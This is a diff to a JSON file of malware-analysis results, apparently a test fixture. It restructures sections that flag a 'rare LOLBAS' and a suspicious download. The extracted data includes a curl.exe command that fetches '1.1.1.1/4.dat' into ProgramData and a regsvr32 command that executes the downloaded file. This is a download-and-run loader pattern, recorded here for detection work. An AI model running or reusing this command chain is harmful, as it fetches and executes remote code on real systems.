@@ -5,7 +5,12 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[{\"LOLBAS\": \"regsvr32\", \"Command\": \"regsvr32 \\\"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\\\"\"}]",
+        "body": [
+          {
+            "Command": "regsvr32 \"C:\\ProgramData\\Pterds\\HErtop.pos\"",
+            "LOLBAS": "regsvr32"
+          }
+        ],
         "body_config": {
           "column_order": [
             "LOLBAS",
@@ -23,13 +28,20 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Possible rare LOLBAS found",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"URL\": \"1.1.1.1/4.dat\", \"Destination\": \"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\", \"Command\": \"curl.exe -o C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos 1.1.1.1/4.dat\"}]",
+        "body": [
+          {
+            "Command": "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat",
+            "Destination": "C:\\ProgramData\\Pterds\\HErtop.pos",
+            "URL": "1.1.1.1/4.dat"
+          }
+        ],
         "body_config": {
           "column_order": [
             "URL",
@@ -48,6 +60,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {
           "dynamic": {
             "process": {
@@ -96,6 +109,7 @@
             "downloads_file_to_programdata": 1
           }
         },
+        "promote_to": null,
         "tags": {
           "file": {
             "path": [
